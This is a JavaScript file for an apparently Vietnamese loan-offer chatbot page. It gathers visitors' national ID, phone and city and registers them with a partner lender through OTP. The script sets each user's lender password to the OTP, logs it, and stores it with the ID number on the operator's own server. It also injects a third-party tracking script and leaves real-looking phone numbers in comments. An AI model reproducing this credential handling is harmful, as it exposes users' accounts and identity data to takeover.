var myLandbot = new LandbotAP('LANDBOT_NAME');
const api_dcredit = 'https://api.kalapa.vn/partner-access';
// const api_dcredit = 'http://api.dcredit.vn';
const api_avay = api_dcredit + '/avay';
const hotro = 'http://hotro.dcredit.vn';
var isSuccessCaptcha = false;
// var countSubmitOtp = 0;
// var isReturn = false;
// 0356119319
// 0972023258
// 0985934902

const guid = function () {
    const s4 = function () {
        return Math.floor((1 + Math.random()) * 0x10000)
            .toString(16)
            .substring(1);
    }
    return s4() + s4() + '-' + s4() + '-' + s4() + '-' + s4() + '-' + s4() + s4() + s4();
}

var current_captcha = "";

var post_data = {
    monthly_income: 3000001,
    purpose: "check_offers",
    source: "website",
    utm_source: "mas_otp"
};

new Fingerprint2().get(function (result, components) {
    post_data.fingerprint = result;
})

//
const checkCaptcha = function () {
    requestAPI({
        method: 'POST',
        path: '/otps',
        data: post_data
    }, function (response) {
        if (response && response.status == "OK" && response.message && response.message.id) {
            post_data.id = response.message.id;
            isSuccessCaptcha = true;
        } else if (response && response.message && response.message.error && response.message.verdict && (response.message.verdict === 'otp_limit_exceeded' || (response.message.verdict === 'phone_limit_exceeded'))) {
            $(window).unbind("beforeunload");
            var notiContent = '';
            if (response.message.verdict === 'phone_limit_exceeded') {
                notiContent = "Bạn chỉ có thể thử tối đa 2 số điện thoại trên cùng một thiết bị. Vui lòng đổi thiết bị khác hoặc thử lại lần sau.";
            } else {
                notiContent = "Số điện thoại của bạn đã vượt quá số lần gửi OTP trong ngày hôm nay. Vui lòng đổi số điện thoại khác hoặc thử lại lần sau.";
            }
            UIkit.modal.confirm(notiContent)
                .then(function () {
                    window.location.reload();
                });
            setTimeout(function () {
                window.location.reload();
            }, 5000);
        } else {
            getCaptcha(function () {
                UIkit.modal.prompt("Anh/chị nhập chưa đúng rồi ạ. Vui lòng nhập lại CHÍNH XÁC 4 ký tự trong hình ảnh nhé, sau đó em mới kiểm tra khoản vay được ạ.<br/>" + current_captcha, '').then(function (captcha_text) {
                    post_data.captcha_text = captcha_text.trim().replace(/\ /g, "");
                    checkCaptcha();
                });
            })
        }
    });
};

const koCoKhoanVay = function (_user, _otp) {
    document.querySelector('#customer_phone').innerHTML = post_data.phone_number;
    document.querySelector('#dcredit_link').setAttribute('href', hotro + '?customer_phone=' + post_data.phone_number + '&social_id=' + post_data.national_id_number + '&city=' + post_data.province);
    UIkit.modal('#modal-error').show();
    var user_info = {
        created_at: new Date(),
        monthly_income: _user.monthly_income,
        national_id_number: _user.national_id_number,
        phone_number: _user.phone_number,
        province: _user.province,
        status: _user.status,
        timestamp: new Date().getTime(),
        user_id: _user.id ? _user.id : (_user.user_id ? _user.user_id : 0),
        otp: _otp
    };
    if (_user.record_id)
        user_info.record_id = _user.record_id;
    createUser(user_info);
    $(window).unbind("beforeunload");
};

const timKhoanVay = function (user, otp) {
    loginAvay(post_data.phone_number, otp, function (_token) {
        if (_token) {
            console.log(otp);
            console.log(post_data);
            console.log(user);
            console.log('---------------');
            setTimeout(function () {
                sendToMO(post_data.phone_number + '_' + otp, 'pending', 'add');
                registrations(_token, function (registration_id, status) {
                    sendToMO(post_data.phone_number + '_' + otp, status, 'update');
                    if (registration_id) {
                        UIkit.modal.confirm('<span>Hệ thống đang duyệt khoản vay, anh chị vui lòng giữ màn hình trong 2 phút ạ...</span><br/><progress id="js-progressbar" class="uk-progress" value="0" max="100"></progress>').then(function () {
                            console.log('Confirmed.')
                        }, function () {
                            console.log('Rejected.')
                        });
                        var bar = document.getElementById('js-progressbar');
                        var animateID = setInterval(function () {
                            bar.value += 2;
                            if (bar.value >= bar.max) {
                                // ---- Tim thay khoan vay ----
                                getLoans(_token, function (loan) {
                                    bar.value = 100;
                                    clearInterval(animateID);
                                    if (loan) {
                                        loan.timestamp = new Date().getTime();
                                        loan.otp = otp;
                                        loan.national_id_number = post_data.national_id_number;
                                        loan.phone_number = post_data.phone_number;
                                        loan.province = post_data.province;
                                        sendToMO(loan.id, loan.status);
                                        if (user.record_id)
                                            loan.record_id = user.record_id;
                                        createUser(loan);
                                    }

                                    if (loan && loan.status == "accepted") {
                                        $('#modal-success .bank_name').html(loan.offer.bank.name);
                                        var amount = Math.round(loan.offer.max_amount / 1000000);
                                        $('#modal-success #max_amount').html(amount);
                                        $('#modal-success #max_tenor').html(loan.offer.max_tenor);
                                        var interest_rate = Math.round((loan.offer.interest_rate / 12) * 100) / 100
                                        $('#modal-success #interest_rate').html(interest_rate);
                                        $('#modal-success .created-time').html(loan.created_at.split("T")[0]);
                                        $('#modal-success .created-time').attr('datetime', loan.created_at);
                                        $('#other_loan').attr('href', hotro + '?customer_phone=' + post_data.phone_number + '&social_id=' + post_data.national_id_number + '&city=' + post_data.province);
                                        UIkit.modal('#modal-success').show();
                                        $(window).unbind("beforeunload");
                                    } else {
                                        $('.uk-modal-dialog .uk-button.uk-button-primary').removeAttr('disabled')
                                        clearInterval(animateID);
                                        koCoKhoanVay(user, otp);
                                    }
                                });
                            }
                        }, 3600);
                        $('.uk-modal-dialog .uk-button.uk-button-primary').attr('disabled', true);
                    }
                    else {
                        user.status = 'not_register';
                        if (status) {
                            user.status = status;
                            if (status == 'no_offer') {
                                getLoans(_token, function (loan, prev_loan) {
                                    if (loan) {
                                        var transaction_id = loan.id;
                                        var transaction_status = loan.status;
                                        loan.timestamp = new Date().getTime();
                                        loan.otp = otp;
                                        if (user.record_id)
                                            loan.record_id = user.record_id;

                                        if (prev_loan)
                                            loan.prev_loan = prev_loan;
                                        createUser(loan);

                                        $('#modal-success .new-user').addClass('uk-hidden');
                                        $('#modal-success .return-user').removeClass('uk-hidden');
                                        $('#modal-success #hotline').html(loan.offer.bank.hotlines[0]);
                                        $('#modal-success #work_hour').html(loan.offer.bank.working_hours[0]);
                                        $('#modal-success .bank_name').html(loan.offer.bank.name);
                                        var amount = Math.round(loan.offer.max_amount / 1000000);
                                        $('#modal-success #max_amount').html(amount);
                                        $('#modal-success #max_tenor').html(loan.offer.max_tenor);
                                        var interest_rate = Math.round((loan.offer.interest_rate / 12) * 100) / 100
                                        $('#modal-success #interest_rate').html(interest_rate);
                                        $('#modal-success .created-time').html(loan.created_at.split("T")[0]);
                                        $('#modal-success .created-time').attr('datetime', loan.created_at);
                                        $('#other_loan').attr('href', hotro + '?customer_phone=' + post_data.phone_number + '&social_id=' + post_data.national_id_number + '&city=' + post_data.province);
                                        UIkit.modal('#modal-success').show();
                                        $(window).unbind("beforeunload");

                                        var today = new Date();
                                        var day_created = new Date(loan.created_at);
                                        if (today.getFullYear() == day_created.getFullYear() && today.getMonth() == day_created.getMonth() && today.getDate() == day_created.getDate()) {
                                            sendToMO(transaction_id, transaction_status);
                                        }
                                    } else {
                                        koCoKhoanVay(user, otp);
                                    }
                                });
                            } else {
                                koCoKhoanVay(user, otp);
                            }
                        } else {
                            koCoKhoanVay(user, otp);
                        }
                    }
                })
            }, 5000);

        } else {
            user.status = 'not_login';
            koCoKhoanVay(user, otp);
        }
    });
}

const changePassword = function (user, token) {
    requestAPI({
        method: 'PUT',
        path: '/users/' + post_data.user_id + '/password',
        authorization: 'Bearer ' + token,
        data: {
            national_id_number: post_data.national_id_number,
            password: user.otp,
            password_confirmation: user.otp,
            phone_number: post_data.phone_number
        }
    }, function (response) {
        if (response && response.message && response.message.id) {
            timKhoanVay(user, user.otp)
        } else {
            koCoKhoanVay(user, user.otp);
        }
    });
}

const checkOTP = function (otp) {

    requestAPI({
        method: 'POST',
        path: '/otps/verify',
        data: {
            code: otp,
            id: post_data.id,
            phone_number: post_data.phone_number
        }
    }, function (response) {
        if (response && response.message && response.message.token) {
            // ---- Nhap OPT thanh cong ----
            var token = response.message.token;
            var user_info = {
                created_at: new Date(),
                monthly_income: post_data.monthly_income,
                national_id_number: post_data.national_id_number,
                phone_number: post_data.phone_number,
                province: post_data.province,
                status: 'valid_otp',
                timestamp: new Date().getTime(),
                user_id: post_data.user_id ? post_data.user_id : 0,
                otp: otp
            };
            post_data.otp = otp;

            (function () {
                var tag = document.createElement('script');
                tag.type = 'text/javascript';
                tag.src = '//rt.gsspat.jp/d?id=15207&j=1';
                document.getElementsByTagName('body')[0].append(tag);
            })();

            createUser(user_info, function (response) {
                var record_id = null;
                if (response && response.message && response.message.record_id) {
                    record_id = response.message.record_id;
                }

                if (post_data.user_id) {
                    if (record_id)
                        user_info.record_id = record_id;
                    changePassword(user_info, token)
                } else {
                    addUser(token, otp, function (user) {
                        if (user) {
                            if (record_id)
                                user.record_id = record_id;
                            timKhoanVay(user, otp)
                        } else {
                            var user_info = {
                                monthly_income: post_data.monthly_income,
                                national_id_number: post_data.national_id_number,
                                phone_number: post_data.phone_number,
                                province: post_data.province,
                                status: 'not_create_user'
                            };
                            if (record_id)
                                user_info.record_id = record_id;
                            koCoKhoanVay(user_info, otp);
                        }
                    })
                }
            });


        } else {
            // countSubmitOtp++;
            // ---- Nhap sai ma OTP ----
            UIkit.modal.prompt("Mã xác nhận chưa đúng, anh/chị vui lòng nhập lại thì mới tìm thấy khoản vay được ạ. Nếu chưa nhận được mã xác nhận thì anh/chị hãy đợi 1-2 phút và kiểm tra điện thoại nhé<br/><img src='images/otp.jpg'>", '').then(function (otp) {
                console.log(otp);
                checkOTP(otp);
            });
        }
    });
};

myLandbot.on('landbot-msg-receive', function (data) {
    if (data && data.message && data.message.indexOf('<div class="customer_name" style="display:none">') > -1) {
        // var match_national_id_number = /\"display\:none\"\>(.*?)\<\/div\>/.exec(data.message);
        var match_national_id_number = /div class=\"social_id\" style=\"display\:none\"\>(.*?)\<\/div\>/.exec(data.message);
        var customer_name = /div class=\"customer_name\" style=\"display\:none\"\>(.*?)\<\/div\>/.exec(data.message);

        if (match_national_id_number[1]) {
            post_data.national_id_number = match_national_id_number[1].trim();
        }
        if (customer_name[1]) {
            post_data.customer_name = customer_name[1].trim();
        } else {
            post_data.customer_name = "none";
        }

        setTimeout(function () {
            getCaptcha()
        }, 2000);
    } else if (data && data.message && data.message.indexOf('<div class="customer_phone" style="display:none">') > -1) {
        var match_phone = /\"display\:none\"\>(.*?)\<\/div\>/.exec(data.message);
        if (match_phone[1]) {
            post_data.phone_number = match_phone[1].trim();
        }
    }
    // else if (data && data.message && data.message.indexOf('<div class="user_id" style="display:none">') > -1) {
    //     var match_user_id = /\"display\:none\"\>(.*?)\<\/div\>/.exec(data.message);
    //     if (match_user_id[1]) {
    //         isReturn = true;
    //         post_data.user_id = match_user_id[1].trim();
    //     }
    // }
    else if (data && data.message && data.message.indexOf('<div class="city" style="display:none">') > -1) {
        var match_city = /\"display\:none\"\>(.*?)\<\/div\>/.exec(data.message);
        if (match_city[1]) {
            post_data.province = match_city[1].trim();
        }
        // } else if (data && data.message && data.message.indexOf('<div id="captcha">') > -1) {
    } else if (data && data.message && data.message.indexOf('<div class="captcha" style="display:none">') > -1) {
        var match_captcha_text = /div class=\"captcha\" style=\"display\:none\"\>(.*?)\<\/div\>/.exec(data.message);
        var match_captcha_key = /div class=\"captcha_key\" style=\"display\:none\"\>(.*?)\<\/div\>/.exec(data.message);
        if (match_captcha_text[1]) {
            post_data.captcha_text = match_captcha_text[1].trim().replace(/\ /g, "");
        }
        if (match_captcha_key[1]) {
            post_data.captcha_key = match_captcha_key[1].trim().replace(/\ /g, "");
        }

        checkCaptcha();
    } else if (data && data.message && data.message.indexOf('<div class="otp" style="display:none">') > -1) {
        var match_otp = /\"display\:none\"\>(.*?)\<\/div\>/.exec(data.message);
        if (match_otp[1]) {
            var otp = match_otp[1];
            checkOTP(otp);
        }
    }

    // else if (isSuccessCaptcha && data.read) {
    // 	// ---- Gui Ma OTP ----
    // 	checkOTP(data.message);
    // }

});
//
const registrations = function (token, callback) {
    requestAPI({
        method: 'POST',
        path: '/registrations',
        authorization: 'Bearer ' + token,
        data: {
            "phone_number": post_data.phone_number,
            "transaction_id": post_data.phone_number + '_' + post_data.otp,
            "click_id": post_data.click_id
        }
    }, function (response) {
        if (response && response.message && response.message.id) {
            callback(response.message.id);
        } else {
            if (response && response.message && response.message.recent_registration && response.message.recent_registration.status) {
                callback(null, response.message.recent_registration.status);
            } else {
                callback(null);
            }
        }
    });
};

const addUser = function (token, code, callback) {
    requestAPI({
        method: 'POST',
        path: '/users',
        authorization: 'Bearer ' + token,
        data: {
            captcha: post_data.captcha_text.trim().replace(/\ /g, ""),
            captcha_key: post_data.captcha_key,
            code: code,
            monthly_income: post_data.monthly_income,
            national_id_number: post_data.national_id_number,
            password: code,
            phone_number: post_data.phone_number,
            province: post_data.province,
            purpose: post_data.purpose
        }
    }, function (response) {
        if (response && response.message && response.message.id) {
            var transaction_id = "otp" + response.message.id;
            var user_info = {
                created_at: new Date(),
                monthly_income: post_data.monthly_income,
                national_id_number: post_data.national_id_number,
                phone_number: post_data.phone_number,
                province: post_data.province,
                status: 'created_user',
                timestamp: new Date().getTime(),
                user_id: response.message.id,
                id: transaction_id,
                otp: code
            };

            createUser(user_info);
            sendToMO(transaction_id, "accepted");
            callback(response);
        } else {
            callback();
        }
    });
};

const requestAPI = function (params, callback) {
    var options = {
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(params)
    }

    fetch(api_avay, options).then(res => res.json())
        .catch(function (error) {
            console.error('Error:', error)
            callback();
        })
        .then(function (response) {
            callback(response);
        });
}

const requestAPIDcredit = function (params, callback) {
    var options = {
        method: params.method,
        headers: {
            'Content-Type': 'application/json'
        }
    }
    if (params.data)
        options.body = JSON.stringify(params.data);

    fetch(params.url, options).then(res => res.json())
        .catch(function (error) {
            console.error('Error:', error)
            callback();
        })
        .then(function (response) {
            callback(response);
        });
}

const loginAvay = function (phone, otp, callback) {
    requestAPI({
        method: 'POST',
        path: '/users/login',
        data: {
            password: otp,
            phone_number: phone
        }
    }, function (response) {
        if (response && response.message && response.message.token) {
            callback(response.message.token);
        } else {
            callback();
        }
    });
}


const createUser = function (user, callback) {
    var ref = getParameterByName('ref');
    var s1 = getParameterByName('s1');
    var s2 = getParameterByName('s2');
    var s3 = getParameterByName('s3');
    var traffic_id = getParameterByName('traffic_id');
    var click_id = getParameterByName('click_id') ? getParameterByName('click_id') : "5c06346d84f73b003c916ee9";
    if (ref) user.ref = ref;
    if (s1) user.s1 = s1;
    if (s2) user.s2 = s2;
    if (s3) user.s3 = s3;
    if (traffic_id) user.traffic_id = traffic_id;
    if (click_id) user.click_id = click_id;
    user.name = post_data.customer_name;

    var url = api_dcredit + '/storage/mo_avay_user';
    // if (isReturn) {
    //     url = api_dcredit + '/user_return';
    // }
    requestAPIDcredit({
        method: 'POST',
        url: url,
        data: user
    }, function (response) {
        if (callback) callback(response);
    });
}

const getLoans = function (token, callback) {
    requestAPI({
        method: 'GET',
        path: '/loans',
        authorization: 'Bearer ' + token
    }, function (response) {
        if (response) {
            if (response && response.message && response.message.loan_list && response.message.loan_list.length) {
                if (response.message.loan_list[1]) {
                    callback(response.message.loan_list[0], response.message.loan_list[1]);
                } else {
                    callback(response.message.loan_list[0]);
                }
            } else {
                callback();
            }
        } else {
            callback();
        }
    });
}

const getParameterByName = function (name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}

const sendToMO = function (transaction_id, status, action) {
    console.log(transaction_id);
    var traffic_id = getParameterByName('traffic_id');
    var transaction_time = new Date();
    var transaction_timestamp = new Date(transaction_time).getTime();
    var data = {
        "traffic_id": traffic_id ? traffic_id : "5b1f9f5d6e3c600041624a55",
        "transaction_id": transaction_id,
        "offer_id": "avay",
        "transaction_time": transaction_timestamp,
        "status": status
    };
    console.log(data);
    requestAPIDcredit({
        method: 'POST',
        url: api_dcredit + (action == 'add' ? '/mo/avay_lead' : '/mo/avay_lead_update'),
        data: data
    }, function (response) {
    });
};

const getCaptcha = function (callback) {
    requestAPIDcredit({
        method: 'GET',
        url: api_dcredit + '/avay/avay_captcha'
    }, function (response) {
        if (response && response.message && response.message.captcha_data) {
            post_data.captcha_key = response.message.captcha_key;
            current_captcha = response.message.captcha_data;
            myLandbot.send('captcha-msg-send', {
                message: response.message.captcha_data
            });
        }
        if (callback) callback();
    });
};

$(window).bind("beforeunload", function (event) {
    return "You have some unsaved changes";
});